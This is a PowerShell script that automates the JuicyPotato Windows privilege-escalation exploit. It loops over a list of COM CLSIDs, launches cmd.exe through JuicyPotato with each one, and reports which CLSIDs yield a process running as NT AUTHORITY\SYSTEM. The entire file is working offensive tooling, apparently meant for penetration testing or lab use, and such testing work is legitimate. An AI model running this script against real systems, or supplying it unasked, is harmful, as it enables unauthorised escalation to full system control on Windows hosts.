# Test CLSIDs for JuicyPotato
# Usage: .\test-clsid.ps1 -juicypotato "path\to\JuicyPotato.exe" -port 1337

param(
    [string]$juicypotato = "JuicyPotato.exe",
    [int]$port = 1337,
    [string[]]$clsids = @(
        "{4991d34b-80a1-4291-83b6-3328366b9097}",
        "{6b3b8f25-589c-4995-b1e8-ea4534176341}",
        "{a47979d2-c419-11d0-8c16-00c04fd918b4}",
        "{61850401-605d-4739-8135-f3c44bb64453}",
        "{d6983230-2152-11d9-a662-0800200c9a66}",
        "{00000000-0000-0000-0000-000000000000}"  # Placeholder for more
    )
)

Write-Host "[*] Testing CLSIDs with JuicyPotato" -ForegroundColor Cyan
Write-Host "    Port: $port" -ForegroundColor Cyan
Write-Host "    CLSIDs to test: $($clsids.Count)`n" -ForegroundColor Cyan

$workingClsids = @()

foreach ($clsid in $clsids) {
    Write-Host "[*] Testing CLSID: $clsid" -ForegroundColor Yellow
    
    $output = & $juicypotato -t * -p "C:\Windows\System32\cmd.exe" -a "/c exit" -l $port -c $clsid 2>&1
    
    if ($output -match "NT AUTHORITY\\SYSTEM" -or $output -match "CreateProcessWithTokenW OK") {
        Write-Host "[+] WORKING: $clsid" -ForegroundColor Green
        $workingClsids += $clsid
    } else {
        Write-Host "[-] Failed: $clsid" -ForegroundColor Red
    }
}

Write-Host "`n[*] Results:" -ForegroundColor Cyan
if ($workingClsids.Count -gt 0) {
    Write-Host "[+] Found $($workingClsids.Count) working CLSID(s):" -ForegroundColor Green
    foreach ($clsid in $workingClsids) {
        Write-Host "    $clsid" -ForegroundColor Green
    }
} else {
    Write-Host "[-] No working CLSIDs found" -ForegroundColor Red
    Write-Host "    Try downloading the full CLSID list from https://ohpe.it/juicy-potato/CLSID/" -ForegroundColor Yellow
}
